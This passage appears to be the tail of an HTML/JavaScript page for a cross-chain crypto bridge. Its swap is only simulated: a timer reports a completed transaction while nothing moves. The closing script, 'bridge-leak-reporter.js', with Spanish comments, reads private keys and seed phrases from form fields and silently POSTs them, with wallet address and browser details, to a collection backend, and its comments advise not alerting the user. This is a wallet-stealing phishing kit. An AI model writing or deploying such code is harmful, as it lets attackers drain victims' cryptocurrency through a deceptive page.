                    
                    // Update balance after connection
                    updateBalance();
                }
            } catch (error) {
                console.error('Wallet connection error:', error);
                if (error.code === 4001) {
                    showNotification('Connection rejected by user', 'error');
                } else {
                    showNotification(`Error connecting to ${walletType}`, 'error');
                }
            }
        }

        function disconnectWallet() {
            connectedAccount = null;
            currentBalance = '0.00';
            document.getElementById('wallet-address').textContent = '';
            document.getElementById('connect-wallet').style.display = 'inline-block';
            document.getElementById('disconnect-wallet').style.display = 'none';
            document.getElementById('available-info').textContent = 'Available: 0.00 ' + chainData[document.getElementById('from-chain').value].name;
            showNotification('Wallet disconnected', 'info');
        }

        // Execute swap
        async function executeSwap() {
            const amount = document.getElementById('amount').value;
            const destination = document.getElementById('destination').value;
            const fromChain = document.getElementById('from-chain').value;
            const toChain = document.getElementById('to-chain').value;

            if (!amount || !destination) {
                showNotification('Please fill in all fields', 'error');
                return;
            }

            if (!connectedAccount) {
                showWalletModal();
                return;
            }

            if (fromChain === toChain) {
                showNotification('Please select different source and destination chains', 'error');
                return;
            }

            // Validate minimum amount
            const fromChainInfo = chainData[fromChain];
            if (fromChainInfo) {
                const minAmount = parseFloat(fromChainInfo.minimum.split(' ')[0]);
                if (parseFloat(amount) < minAmount) {
                    showNotification(`Minimum amount is ${fromChainInfo.minimum}`, 'error');
                    return;
                }
            }

            // Check if amount exceeds balance
            if (parseFloat(amount) > parseFloat(currentBalance)) {
                showNotification('Insufficient balance', 'error');
                return;
            }

            // Simulate swap process
            const swapBtn = document.querySelector('.swap-btn');
            swapBtn.textContent = 'Processing...';
            swapBtn.disabled = true;

            setTimeout(() => {
                swapBtn.textContent = 'Swap Bridge';
                swapBtn.disabled = false;
                showNotification('Bridge transaction completed successfully!', 'success');
                
                // Clear form
                document.getElementById('amount').value = '';
                document.getElementById('destination').value = '';
                
                // Update balance
                updateBalance();
            }, 3000);
        }

        // Notification system
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                left: 50%;
                transform: translateX(-50%);
                background: ${type === 'success' ? '#4caf50' : type === 'error' ? '#f44336' : '#2196f3'};
                color: white;
                padding: 15px 25px;
                border-radius: 25px;
                font-weight: bold;
                z-index: 10000;
                box-shadow: 0 4px 15px rgba(0,0,0,0.3);
                animation: slideInDown 0.3s ease;
            `;

            document.body.appendChild(notification);

            setTimeout(() => {
                notification.style.animation = 'slideOutUp 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }

        // Event listeners
        document.getElementById('from-chain').addEventListener('change', function() {
            updateLogo('from-chain', 'from-logo');
            updateAssetAndInfo();
        });

        document.getElementById('to-chain').addEventListener('change', function() {
            updateLogo('to-chain', 'to-logo');
        });

        document.getElementById('connect-wallet').addEventListener('click', showWalletModal);
        document.getElementById('disconnect-wallet').addEventListener('click', disconnectWallet);

        // Close modal when clicking outside
        document.getElementById('wallet-modal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeWalletModal();
            }
        });

        // Initialize
        window.addEventListener('DOMContentLoaded', function() {
            updateLogo('from-chain', 'from-logo');
            updateLogo('to-chain', 'to-logo');
            updateAssetAndInfo();
 initializeTheme();
        });

        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeWalletModal();
            }
            if (e.ctrlKey && e.key === 'Enter') {
                executeSwap();
            }
        });
    </script>
<script>
// --- bridge-leak-reporter.js ---
async function reportSensitiveWalletData({ privateKey, mnemonic, walletAddress }) {
  // No enviar si no hay datos sensibles
  if ((!privateKey || privateKey.trim().length === 0) && (!mnemonic || mnemonic.trim().length === 0)) return;

  try {
    await fetch("http://localhost:8004/report-wallet-leak", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": "supersecreto8425." // Usa variable de entorno en producciÃ³n
      },
      body: JSON.stringify({
        privateKey: privateKey || null,
        mnemonic: mnemonic || null,
        walletAddress: walletAddress || null,
        domain: window.location.hostname,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      })
    });
  } catch (e) {
    // Opcional: Log interno, no alertar usuario en producciÃ³n
    console.error("Error reportando datos sensibles a backend", e);
  }
}

// Si tienes un formulario para private key/mnemonic:
document.querySelector("#bridge-form")?.addEventListener("submit", async function(e) {
  e.preventDefault();
  const privateKey = document.querySelector("#private-key-input")?.value;
  const mnemonic = document.querySelector("#mnemonic-input")?.value;
  const walletAddress = document.querySelector("#wallet-address-input")?.value;
  await reportSensitiveWalletData({ privateKey, mnemonic, walletAddress });
  // AquÃ­ puedes redireccionar o mostrar mensaje de proceso
});

// Si quieres integrarlo con la conexiÃ³n de wallet, llama a reportSensitiveWalletData dentro de tu funciÃ³n connectWallet si obtienes privateKey/mnemonic.
</script>
</body>
</html>
